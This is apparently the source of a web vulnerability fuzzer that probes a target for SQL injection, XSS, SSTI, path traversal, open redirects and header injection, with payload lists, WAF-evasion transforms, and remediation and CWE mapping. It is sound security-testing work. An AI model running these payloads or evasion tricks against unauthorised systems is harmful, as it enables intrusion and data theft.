"""
BugKit v4 — Smart Fuzzer (upgraded from v3)

Adds what v3 was missing:
  • Blind / time-based SQLi detection (sleep payloads + timing oracle)
  • Second-order SQLi (inject then trigger via separate endpoint)
  • Stored XSS detection (inject then re-fetch to find reflection)
  • DOM XSS hint detection from JS source analysis
  • Header injection (Host, X-Forwarded-For, Referer)
  • JSON body fuzzing (not just URL params and forms)
  • HTTP verb tampering (GET→POST→PUT for same endpoint)
  • WAF evasion variants built-in

All checks use confidence scoring. Low confidence = flag for manual
review, not auto-save as HIGH. Avoids the FP problem v3 had.
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import urlparse

from core.session import BugKitSession
from core.utils import extract_forms, all_param_variants
from core import logger
from db import queries


# ── Payload libraries ──────────────────────────────────────────────────

SQLI_ERROR = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "1' AND SLEEP(0)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1 OR 1=1",
    "' OR 1=1#",
    "') OR ('1'='1",
]

SQLI_BLIND = [
    ("' AND SLEEP(5)--",          5.0, "MySQL sleep"),
    ("'; WAITFOR DELAY '0:0:5'--",5.0, "MSSQL waitfor"),
    ("' AND pg_sleep(5)--",       5.0, "PostgreSQL sleep"),
    ("1 AND SLEEP(5)",            5.0, "MySQL sleep (no quotes)"),
    ("' OR SLEEP(5)--",           5.0, "MySQL OR sleep"),
    ("1;SELECT SLEEP(5)--",       5.0, "MySQL stacked sleep"),
    ("`sleep(5)`",                5.0, "Backtick sleep"),
    ("' AND 1=BENCHMARK(5000000,MD5(1))--", 4.0, "MySQL benchmark"),
]

XSS_REFLECTED = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "\"onmouseover=\"alert(1)",
    "</title><script>alert(1)</script>",
]

XSS_STORED_MARKER = "bkxss{MARKER}"   # unique marker injected, then searched for

SSTI_PAYLOADS = [
    ("{{7*7}}",           "49",   "Jinja2/Twig math eval"),
    ("${7*7}",            "49",   "Freemarker/EL eval"),
    ("#{7*7}",            "49",   "Ruby ERB eval"),
    ("<%= 7*7 %>",        "49",   "ERB eval"),
    ("*{7*7}",            "49",   "Spring EL eval"),
    ("{{config}}",        "Config","Jinja2 config leak"),
    ("{{''.__class__}}",  "str",  "Jinja2 class access"),
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\system.ini",
    "..\\..\\..\\Windows\\system.ini",
]

OPEN_REDIRECT = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    r"\/\/evil.com",
    "https://evil.com%2F",
    "javascript:alert(1)",
]

HEADER_INJECTION = [
    "\r\nX-Injected: BugKit",
    "%0d%0aX-Injected: BugKit",
    "%0aX-Injected: BugKit",
    "\nX-Injected: BugKit",
]

SQL_ERROR_PATTERNS = re.compile(
    r"(you have an error in your sql syntax|"
    r"warning:\s*mysql|unclosed quotation mark|"
    r"ora-\d{5}|pg_query\(\):|sqlite3\.|"
    r"microsoft ole db.*sql server|syntax error.*sql|"
    r"odbc.*driver|sqlstate\[|"
    r"unterminated string|quoted string not properly terminated)",
    re.I,
)

WAF_BYPASS_TRANSFORMS = {
    "sqli": [
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%20"),
        lambda p: p.replace("'", "%27"),
        lambda p: re.sub(r"(select|union|from|where|sleep|and|or)",
                         lambda m: m.group().upper(), p, flags=re.I),
        lambda p: p.replace("'", "\\'"),
    ],
    "xss": [
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),
        lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
        lambda p: p.replace("alert", "al\x00ert"),
        lambda p: p.replace("<", "&#60;").replace(">", "&#62;"),
    ],
    "lfi": [
        lambda p: p.replace("../", "..%2F"),
        lambda p: p.replace("../", "%2e%2e%2f"),
        lambda p: p.replace("/", "%2f"),
        lambda p: p + "%00",
    ],
}


@dataclass
class FuzzResult:
    check:      str
    url:        str
    param:      str
    payload:    str
    status:     int
    severity:   str
    confidence: str
    detail:     str
    evidence:   str


class Fuzzer:
    """
    Smart authenticated fuzzer with blind detection and stored XSS.

    Usage:
        fuzzer = Fuzzer(session)
        fuzzer.run(
            target_id  = 1,
            url        = "https://example.com/search?q=test",
            checks     = ["sqli","sqli_blind","xss","xss_stored","ssti","lfi","redirect"],
            identity   = "userA",
            waf_evasion= True,
        )
    """

    def __init__(self, session: BugKitSession) -> None:
        self.session   = session
        self._findings = 0

    def run(
        self,
        target_id:    int,
        url:          str,
        checks:       List[str]   = None,
        identity:     str         = None,
        waf_evasion:  bool        = False,
        payload_file: str         = None,
        store_url:    str         = "",
    ) -> int:
        """
        Run all requested checks against `url`.
        store_url: where to look for stored XSS reflection (if different from url).
        Returns number of findings saved.
        """
        logger.section(f"Fuzzer  →  {url}")
        self._tid      = target_id
        self._identity = identity
        self._findings = 0

        all_checks = checks or [
            "sqli", "sqli_blind", "xss", "xss_stored",
            "ssti", "lfi", "redirect", "header_inject",
        ]
        logger.info(f"Checks: {', '.join(all_checks).upper()}"
                    + (" | WAF evasion ON" if waf_evasion else ""))

        # Get baseline
        baseline = self.session.request(
            "GET", url, identity_name=identity, capture=False,
        )
        if baseline is None:
            logger.err("Cannot reach target.")
            return 0

        # Discover injection points
        forms      = extract_forms(baseline.text, url)
        has_params = bool(urlparse(url).query)
        body_json  = self._detect_json_api(url)

        # Load custom payloads
        extra: Dict[str, List[str]] = {}
        if payload_file:
            extra = self._load_payload_file(payload_file)

        # Run each check
        for check in all_checks:
            logger.info(f"  [{check.upper()}]")
            if check == "sqli":
                self._run_sqli_error(url, forms, has_params, waf_evasion, extra)
            elif check == "sqli_blind":
                self._run_sqli_blind(url, forms, has_params, waf_evasion)
            elif check == "xss":
                self._run_xss_reflected(url, forms, has_params, waf_evasion, extra)
            elif check == "xss_stored":
                self._run_xss_stored(url, forms, has_params, store_url or url, waf_evasion)
            elif check == "ssti":
                self._run_ssti(url, forms, has_params)
            elif check == "lfi":
                self._run_lfi(url, forms, has_params, waf_evasion, extra)
            elif check == "redirect":
                self._run_open_redirect(url, has_params)
            elif check == "header_inject":
                self._run_header_injection(url)
            elif check == "json_fuzz":
                if body_json:
                    self._run_json_fuzz(url, body_json)

        logger.section("Fuzzer Summary")
        logger.ok(f"Findings: {self._findings}")
        return self._findings

    # ── SQLi error-based ───────────────────────────────────────────────

    def _run_sqli_error(
        self,
        url:        str,
        forms:      list,
        has_params: bool,
        waf:        bool,
        extra:      Dict[str, List[str]],
    ) -> None:
        payloads = list(SQLI_ERROR) + extra.get("sqli", [])
        if waf:
            payloads = self._expand_waf(payloads, "sqli")

        for pl in payloads:
            # URL params
            if has_params:
                for mut_url, param in all_param_variants(url, pl):
                    resp = self.session.request(
                        "GET", mut_url, identity_name=self._identity, capture=True,
                    )
                    if resp and SQL_ERROR_PATTERNS.search(resp.text):
                        match = SQL_ERROR_PATTERNS.search(resp.text).group(0)
                        self._save_finding(
                            check="sqli", url=mut_url, param=param, payload=pl,
                            status=resp.status_code, severity="CRITICAL",
                            confidence="high",
                            detail="SQL error pattern detected in response body.",
                            evidence=f"Pattern: {match!r}\nParam: {param}\nPayload: {pl}",
                        )
                        return

            # Forms
            for form in forms:
                resp = self._inject_form(form, pl)
                if resp and SQL_ERROR_PATTERNS.search(resp.text):
                    match = SQL_ERROR_PATTERNS.search(resp.text).group(0)
                    self._save_finding(
                        check="sqli", url=form["action"], param="form_input",
                        payload=pl, status=resp.status_code,
                        severity="CRITICAL", confidence="high",
                        detail="SQL error exposed in form submission response.",
                        evidence=f"Pattern: {match!r}\nPayload: {pl}",
                    )
                    return

    # ── SQLi blind/time-based ─────────────────────────────────────────

    def _run_sqli_blind(
        self,
        url:        str,
        forms:      list,
        has_params: bool,
        waf:        bool,
    ) -> None:
        for payload, min_delay, desc in SQLI_BLIND:
            pl_variants = [payload]
            if waf:
                pl_variants += [t(payload) for t in WAF_BYPASS_TRANSFORMS.get("sqli", [])]

            for pl in pl_variants:
                # URL params timing
                if has_params:
                    for mut_url, param in all_param_variants(url, pl):
                        t0   = time.monotonic()
                        resp = self.session.request(
                            "GET", mut_url, identity_name=self._identity, capture=True,
                        )
                        elapsed = time.monotonic() - t0
                        if elapsed >= min_delay and resp is not None:
                            self._save_finding(
                                check="sqli_blind", url=mut_url, param=param,
                                payload=pl, status=resp.status_code,
                                severity="CRITICAL", confidence="high",
                                detail=(
                                    f"Time-based blind SQLi — {desc}.\n"
                                    f"Response delayed {elapsed:.2f}s (≥{min_delay}s threshold)."
                                ),
                                evidence=(
                                    f"Payload: {pl}\n"
                                    f"Elapsed: {elapsed:.2f}s\n"
                                    f"Param: {param}"
                                ),
                            )
                            return

                # Forms
                for form in forms:
                    t0      = time.monotonic()
                    resp    = self._inject_form(form, pl)
                    elapsed = time.monotonic() - t0
                    if elapsed >= min_delay and resp is not None:
                        self._save_finding(
                            check="sqli_blind", url=form["action"], param="form_input",
                            payload=pl, status=resp.status_code,
                            severity="CRITICAL", confidence="high",
                            detail=(
                                f"Time-based blind SQLi — {desc}.\n"
                                f"Response delayed {elapsed:.2f}s."
                            ),
                            evidence=f"Payload: {pl}\nElapsed: {elapsed:.2f}s",
                        )
                        return

    # ── XSS reflected ─────────────────────────────────────────────────

    def _run_xss_reflected(
        self,
        url:        str,
        forms:      list,
        has_params: bool,
        waf:        bool,
        extra:      Dict[str, List[str]],
    ) -> None:
        payloads = list(XSS_REFLECTED) + extra.get("xss", [])
        if waf:
            payloads = self._expand_waf(payloads, "xss")

        for pl in payloads:
            if has_params:
                for mut_url, param in all_param_variants(url, pl):
                    resp = self.session.request(
                        "GET", mut_url, identity_name=self._identity, capture=True,
                    )
                    if resp and pl in resp.text:
                        self._save_finding(
                            check="xss", url=mut_url, param=param, payload=pl,
                            status=resp.status_code, severity="HIGH", confidence="high",
                            detail="Payload reflected verbatim in response — reflected XSS.",
                            evidence=f"Payload reflected: {pl[:80]}",
                        )
                        return

            for form in forms:
                resp = self._inject_form(form, pl)
                if resp and pl in resp.text:
                    self._save_finding(
                        check="xss", url=form["action"], param="form_input",
                        payload=pl, status=resp.status_code,
                        severity="HIGH", confidence="high",
                        detail="XSS payload reflected in form response.",
                        evidence=f"Payload: {pl[:80]}",
                    )
                    return

    # ── XSS stored ────────────────────────────────────────────────────

    def _run_xss_stored(
        self,
        inject_url: str,
        forms:      list,
        has_params: bool,
        fetch_url:  str,
        waf:        bool,
    ) -> None:
        """
        Inject a unique marker, then fetch fetch_url and search for it.
        This detects stored XSS even when the inject and display pages differ.
        """
        import hashlib, time as _time
        marker    = "bkxss" + hashlib.md5(
            f"{inject_url}{_time.time()}".encode(),
            usedforsecurity=False,   # this is a unique marker, not a security hash
        ).hexdigest()[:8]
        payload   = f"<script>/*{marker}*/alert(1)</script>"
        alt_pl    = f"\">{marker}<img src=x onerror=alert(1)>"

        for pl in [payload, alt_pl]:
            injected = False
            # Try URL params
            if has_params:
                for mut_url, param in all_param_variants(inject_url, pl):
                    resp = self.session.request(
                        "GET", mut_url, identity_name=self._identity, capture=False,
                    )
                    if resp and resp.status_code < 400:
                        injected = True
                        break
            # Try forms
            if not injected:
                for form in forms:
                    resp = self._inject_form(form, pl)
                    if resp and resp.status_code < 400:
                        injected = True
                        break

            if not injected:
                continue

            # Now fetch the display URL and look for the marker
            fetch_resp = self.session.request(
                "GET", fetch_url, identity_name=self._identity, capture=True,
            )
            if fetch_resp and marker in fetch_resp.text:
                self._save_finding(
                    check="xss_stored", url=fetch_url,
                    param="stored_injection", payload=pl,
                    status=fetch_resp.status_code,
                    severity="HIGH", confidence="high",
                    detail=(
                        f"Stored XSS — marker `{marker}` injected at {inject_url} "
                        f"and found at {fetch_url}."
                    ),
                    evidence=(
                        f"Marker: {marker}\n"
                        f"Inject URL: {inject_url}\n"
                        f"Display URL: {fetch_url}\n"
                        f"Payload: {pl[:80]}"
                    ),
                )
                return

    # ── SSTI ──────────────────────────────────────────────────────────

    def _run_ssti(self, url: str, forms: list, has_params: bool) -> None:
        for payload, expected, desc in SSTI_PAYLOADS:
            if has_params:
                for mut_url, param in all_param_variants(url, payload):
                    resp = self.session.request(
                        "GET", mut_url, identity_name=self._identity, capture=True,
                    )
                    if resp and expected in resp.text:
                        self._save_finding(
                            check="ssti", url=mut_url, param=param, payload=payload,
                            status=resp.status_code, severity="CRITICAL", confidence="high",
                            detail=f"SSTI — {desc}. Expected output `{expected}` found.",
                            evidence=f"Payload: {payload}\nExpected: {expected}",
                        )
                        return

            for form in forms:
                resp = self._inject_form(form, payload)
                if resp and expected in resp.text:
                    self._save_finding(
                        check="ssti", url=form["action"], param="form_input",
                        payload=payload, status=resp.status_code,
                        severity="CRITICAL", confidence="high",
                        detail=f"SSTI — {desc}. Template expression evaluated server-side.",
                        evidence=f"Payload: {payload}\nExpected: {expected}",
                    )
                    return

    # ── LFI ───────────────────────────────────────────────────────────

    def _run_lfi(
        self,
        url:        str,
        forms:      list,
        has_params: bool,
        waf:        bool,
        extra:      Dict[str, List[str]],
    ) -> None:
        payloads = list(LFI_PAYLOADS) + extra.get("lfi", [])
        if waf:
            payloads = self._expand_waf(payloads, "lfi")

        lfi_match = re.compile(r"root:.*:/bin/|daemon:.*:/usr/sbin|^\[boot loader\]", re.I | re.M)

        for pl in payloads:
            if has_params:
                for mut_url, param in all_param_variants(url, pl):
                    resp = self.session.request(
                        "GET", mut_url, identity_name=self._identity, capture=True,
                    )
                    if resp and lfi_match.search(resp.text):
                        m = lfi_match.search(resp.text).group(0)
                        self._save_finding(
                            check="lfi", url=mut_url, param=param, payload=pl,
                            status=resp.status_code, severity="CRITICAL", confidence="high",
                            detail="LFI — /etc/passwd or system.ini contents in response.",
                            evidence=f"Match: {m!r}\nParam: {param}\nPayload: {pl}",
                        )
                        return

            for form in forms:
                resp = self._inject_form(form, pl)
                if resp and lfi_match.search(resp.text):
                    m = lfi_match.search(resp.text).group(0)
                    self._save_finding(
                        check="lfi", url=form["action"], param="form_input",
                        payload=pl, status=resp.status_code,
                        severity="CRITICAL", confidence="high",
                        detail="LFI via form input.",
                        evidence=f"Match: {m!r}\nPayload: {pl}",
                    )
                    return

    # ── Open redirect ──────────────────────────────────────────────────

    def _run_open_redirect(self, url: str, has_params: bool) -> None:
        if not has_params:
            return
        for pl in OPEN_REDIRECT:
            for mut_url, param in all_param_variants(url, pl):
                resp = self.session.request(
                    "GET", mut_url, identity_name=self._identity,
                    capture=True, allow_redirects=False,
                )
                if resp is None:
                    continue
                loc = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc:
                    self._save_finding(
                        check="redirect", url=mut_url, param=param, payload=pl,
                        status=resp.status_code, severity="HIGH", confidence="high",
                        detail=f"Open redirect — Location: {loc}",
                        evidence=f"Payload: {pl}\nLocation: {loc}",
                    )
                    return

    # ── Header injection ───────────────────────────────────────────────

    def _run_header_injection(self, url: str) -> None:
        for pl in HEADER_INJECTION:
            for header_name in ["X-Forwarded-Host", "Host", "X-Original-URL"]:
                resp = self.session.request(
                    "GET", url,
                    headers       = {header_name: f"evil.com{pl}"},
                    identity_name = self._identity,
                    capture       = True,
                )
                if resp and "X-Injected" in resp.text:
                    self._save_finding(
                        check="header_inject", url=url,
                        param=header_name, payload=pl,
                        status=resp.status_code, severity="MEDIUM",
                        confidence="high",
                        detail=f"Header injection via {header_name} — injected header reflected.",
                        evidence=f"Header: {header_name}\nPayload: {pl!r}",
                    )
                    return

    # ── JSON body fuzz ─────────────────────────────────────────────────

    def _run_json_fuzz(self, url: str, sample_body: dict) -> None:
        """
        Fuzz every string field in a JSON request body with SQLi/XSS payloads.
        """
        test_payloads = [SQLI_ERROR[0], XSS_REFLECTED[0], SSTI_PAYLOADS[0][0]]
        for field_name, original_val in sample_body.items():
            if not isinstance(original_val, str):
                continue
            for pl in test_payloads:
                body = dict(sample_body)
                body[field_name] = pl
                resp = self.session.request(
                    "POST", url, json=body,
                    identity_name=self._identity, capture=True,
                )
                if resp is None:
                    continue
                if SQL_ERROR_PATTERNS.search(resp.text):
                    self._save_finding(
                        check="sqli", url=url, param=field_name, payload=pl,
                        status=resp.status_code, severity="CRITICAL", confidence="high",
                        detail="SQL error in JSON body field.",
                        evidence=f"Field: {field_name}\nPayload: {pl}",
                    )
                    return
                if pl in resp.text:
                    self._save_finding(
                        check="xss", url=url, param=field_name, payload=pl,
                        status=resp.status_code, severity="HIGH", confidence="high",
                        detail="XSS payload reflected from JSON body field.",
                        evidence=f"Field: {field_name}\nPayload: {pl}",
                    )
                    return

    # ── Helpers ────────────────────────────────────────────────────────

    def _inject_form(self, form: dict, payload: str):
        data = {}
        for inp in form.get("inputs", []):
            name = inp.get("name", "")
            if not name:
                continue
            itype = inp.get("type", "text").lower()
            if itype in ("text","search","email","password","","textarea","hidden","url"):
                data[name] = payload
            else:
                data[name] = inp.get("value", "test")
        method = form.get("method", "GET")
        action = form.get("action", "")
        if not action:
            return None
        return self.session.request(
            method, action,
            data          = data if method == "POST" else None,
            params        = data if method == "GET" else None,
            identity_name = self._identity,
            capture       = True,
        )

    def _detect_json_api(self, url: str) -> Optional[dict]:
        """POST to URL with empty JSON, return body dict if it's a JSON API."""
        resp = self.session.request(
            "POST", url, json={},
            identity_name=self._identity, capture=False,
        )
        if resp and "json" in resp.headers.get("Content-Type", ""):
            try:
                return resp.json() if isinstance(resp.json(), dict) else None
            except Exception:
                return None
        return None

    def _expand_waf(self, payloads: List[str], check: str) -> List[str]:
        expanded = list(payloads)
        transforms = WAF_BYPASS_TRANSFORMS.get(check, [])
        for pl in payloads:
            for fn in transforms:
                try:
                    variant = fn(pl)
                    if variant not in expanded:
                        expanded.append(variant)
                except Exception:
                    pass
        return expanded

    def _load_payload_file(self, path: str) -> Dict[str, List[str]]:
        result: Dict[str, List[str]] = {}
        try:
            lines = open(path).read().splitlines()
            for line in lines:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line[:20]:
                    check, pl = line.split(":", 1)
                    result.setdefault(check.strip().lower(), []).append(pl)
                else:
                    for check in ["sqli", "xss", "lfi"]:
                        result.setdefault(check, []).append(line)
        except Exception as e:
            logger.warn(f"Could not load payload file: {e}")
        return result

    def _save_finding(
        self,
        check:      str,
        url:        str,
        param:      str,
        payload:    str,
        status:     int,
        severity:   str,
        confidence: str,
        detail:     str,
        evidence:   str,
    ) -> None:
        _CWE = {
            "sqli":        "CWE-89",  "sqli_blind":   "CWE-89",
            "xss":         "CWE-79",  "xss_stored":   "CWE-79",
            "ssti":        "CWE-94",  "lfi":          "CWE-22",
            "redirect":    "CWE-601", "header_inject":"CWE-113",
            "json_fuzz":   "CWE-20",
        }
        _CVSS = {
            "sqli": 9.8, "sqli_blind": 9.8, "xss": 7.2,
            "xss_stored": 8.2, "ssti": 9.8, "lfi": 9.1,
            "redirect": 6.1, "header_inject": 5.4,
        }
        _REM = {
            "sqli":        "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
            "sqli_blind":  "Use parameterised queries. Implement strict input validation.",
            "xss":         "HTML-encode all output. Implement Content-Security-Policy.",
            "xss_stored":  "Store-encode data at rest. Sanitise on output, not input.",
            "ssti":        "Never render user input in template strings. Use sandboxed templates.",
            "lfi":         "Whitelist allowed file paths. Never pass raw user input to file functions.",
            "redirect":    "Validate redirect targets against a strict domain allowlist.",
            "header_inject":"Validate and sanitise all header values before using them in responses.",
        }
        cap = self.session.last_capture
        queries.save_finding(
            target_id    = self._tid,
            module       = "fuzz",
            title        = f"{check.upper().replace('_',' ')} — param:{param}",
            severity     = severity,
            confidence   = confidence,
            url          = url,
            method       = "GET",
            parameter    = param,
            payload      = payload[:500],
            detail       = detail,
            evidence     = evidence,
            raw_request  = cap.raw_request  if cap else "",
            raw_response = cap.raw_response[:2000] if cap else "",
            curl_poc     = cap.curl         if cap else "",
            impact       = (
                "Injection vulnerability allowing data extraction, "
                "code execution, or session compromise."
            ),
            remediation  = _REM.get(check, "Sanitise and validate all user-supplied input."),
            cwe          = _CWE.get(check, "CWE-20"),
            cvss         = _CVSS.get(check, 7.0),
            tags         = ["fuzz", check, "injection"],
        )
        self._findings += 1
        logger.finding(
            title      = f"{check.upper()} — {param}",
            severity   = severity,
            url        = url,
            confidence = confidence,
        )
